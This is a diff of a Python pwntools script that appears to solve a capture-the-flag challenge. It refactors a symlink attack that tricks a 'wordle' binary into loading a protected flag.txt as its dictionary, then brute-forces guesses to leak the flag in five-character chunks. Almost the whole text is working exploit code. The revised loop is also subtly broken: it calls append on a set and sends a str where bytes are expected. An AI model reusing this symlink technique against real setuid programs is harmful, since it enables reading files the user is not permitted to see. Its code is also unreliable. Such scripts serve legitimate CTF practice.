@@ -3,7 +3,6 @@ from pwn import *
 import tempfile
 import os
 import sys
-import itertools
 import string
 
 # The Wordle word size
@@ -11,6 +10,75 @@ WORD_SIZE = 5
 
 # Defines our alphabet
 ALPHABET = string.ascii_uppercase + '_{}'
+
+def find_dictionary_word(p, dictionary_words):
+    """
+        Finds a dictionary word.
+    """
+    
+    # Iterate all options
+    attempt_num = 0
+    with log.progress('Attempting to get one dictionary word') as pbar:
+        for candidate in dictionary_words:
+            attempt_num += 1
+            pbar.status(f'{candidate} ({attempt_num} / {len(dictionary_words)})')
+            p.sendline(candidate.encode())
+            output = p.recvuntil(b'Enter your current attempt: ')
+            if b'Word is not a dictionary word.' not in output:
+                log.info(f'Found dictionary word "{candidate}"')
+                return candidate
+
+    # Should never happen
+    raise Exception('Was not able to find any dictionary words')
+
+def run_symlink_attack(target_dir):
+    """
+        Runs the symlink attack and returns the following tuple:
+            1. The process to interact with.
+            2. The number of words in the flag.
+    """
+
+    # Conclude paths
+    exe_target_file = os.path.join(target_dir, 'wordle')
+    flag_target_file = os.path.join(target_dir, 'flag.txt')
+    assert os.path.isfile(exe_target_file), Exception(f'Could not find target executable file under directory "{target_dir}"')
+    assert os.path.isfile(flag_target_file), Exception(f'Could not find target flag file under directory "{target_dir}"')
+
+    # Get the flag size
+    flag_size = os.stat(flag_target_file).st_size
+    assert flag_size % WORD_SIZE == 0, Exception(f'Flag size {flag_size} must divide by {WORD_SIZE}')
+    flag_words = flag_size // WORD_SIZE
+    log.info(f'Flag is {flag_size} bytes = {flag_words} words')
+
+    # Create a symlink for executable
+    temp_dir = tempfile.mkdtemp()
+    exe_symlink_path = os.path.join(temp_dir, 'sym')
+    os.symlink(exe_target_file, exe_symlink_path)
+    log.info(f'Created symlink for executable at "{exe_symlink_path}"')
+
+    # Create a symlink for the flag
+    flag_symlink_path = os.path.join(temp_dir, 'dictionary.txt')
+    os.symlink(flag_target_file, flag_symlink_path)
+    log.info(f'Created symlink for flag at "{flag_symlink_path}"')
+
+    # Run process
+    p = process(exe_symlink_path)
+    return (p, flag_words)
+
+def get_dictionary_words(target_dir):
+    """
+        Get the original dictionary words.
+    """
+
+    # Read the original dictionary
+    dict_file = os.path.join(target_dir, 'dictionary.txt')
+    assert os.path.isfile(dict_file), Exception('Could not find dictionary file under target directory "{target_dir}"')
+    with open(dict_file, 'r') as fp:
+        content = fp.read()
+
+    # Split to words
+    assert len(content) % WORD_SIZE == 0, Exception(f'Original dictionary must divide by {WORD_SIZE}')
+    return [ content[i:i+WORD_SIZE] for i in range(0, len(content), WORD_SIZE) ]
 
 def solve():
     """
@@ -20,57 +88,43 @@ def solve():
     # Catch exceptions
     try:
 
-        # Container for gathered words
-        gathered_words = []
-        dictionary_word = None
-
-        # Get the target directory
+        # Parse argument and run extensive checks
         assert len(sys.argv) >= 2, Exception('Missing target directory argument')
         target_dir = os.path.abspath(sys.argv[1])
-        exe_target_file = os.path.join(target_dir, 'wordle')
-        flag_target_file = os.path.join(target_dir, 'flag.txt')
-        assert os.path.isfile(exe_target_file), Exception('Target directory does not have the target executable file')
-        assert os.path.isfile(flag_target_file), Exception('Target directory does not have the target flag file')
+        assert os.path.isdir(target_dir), Exception(f'Path is not a directory: "{target_dir}"')
         log.info(f'Target directory is "{target_dir}"')
 
-        # Get the flag size
-        flag_size = os.stat(flag_target_file).st_size
-        assert flag_size % WORD_SIZE == 0, Exception(f'Flag size {flag_size} must divide in {WORD_SIZE}')
-        flag_words = flag_size // WORD_SIZE
-        log.info(f'Flag is {flag_size} bytes = {flag_words} words')
+        # Get the dictionary words
+        dictionary_words = get_dictionary_words(target_dir)
 
-        # Create a symlink for executable
-        temp_dir = tempfile.mkdtemp()
-        exe_symlink_path = os.path.join(temp_dir, 'sym')
-        os.symlink(exe_target_file, exe_symlink_path)
-        log.info(f'Created symlink for executable at "{exe_symlink_path}"')
+        # Run symlink attack
+        p, flag_words = run_symlink_attack(target_dir)
 
-        # Create a symlink for the flag
-        flag_symlink_path = os.path.join(temp_dir, 'dictionary.txt')
-        os.symlink(flag_target_file, flag_symlink_path)
-        log.info(f'Created symlink for flag at "{flag_symlink_path}"')
-
-        # Run process
-        p = process(exe_symlink_path)
+        # Find a dictionary word
+        dictionary_word = find_dictionary_word(p, dictionary_words) 
 
         # Continue until we get enough words
+        gathered_words = set()
         while len(gathered_words) < flag_words:
 
-            # Receive until we can get the next word
-            p.recvuntil(b'Enter your current attempt: ')
+            # Exhaust all attempts with dictionary word
+            while True:
+                
+                # Wait until we program asks for input
+                output = p.recvuntil(b': ')
             
-            # Start guessing until we have at least once dictionary word
-            if dictionary_word is None:
-                with log.progress('Attempting to get one dictionary word') as pbar:
-                    for option in itertools.product(ALPHABET, repeat=WORD_SIZE):
-                        candidate = ''.join(option)
-                        pbar.status(candidate)
-                        p.sendline(candidate.encode())
-                        if b'Word is not a dictionary word.' not in p.recvuntil(b'Enter your current attempt: '):
-                            dictionary_word = candidate
-                            break
-                log.info(f'Found dictionary word "{dictionary_word}"')
+                # Handle all attempts
+                if output.endswith(b'Enter your current attempt: '):
+                    p.sendline(dictionary_word)
+                    continue
 
+                # Extract word
+                assert b'You failed guessing the word ' in output, Exception(f'Unexpected output from program {output}')
+                word = ''.join([ c for c in output.split(b'You failed guessing the word ')[1].split(b'\n')[0].decode() if c in ALPHABET ])
+                assert len(word) == WORD_SIZE, Exception(f'Got an unexpected word "{word}"')
+                if word not in gathered_words:
+                    gathered_words.append(word)
+                    log.info(f'Got new chunk: "{word}"')
 
     # Log exceptions and quit
     except Exception as ex:
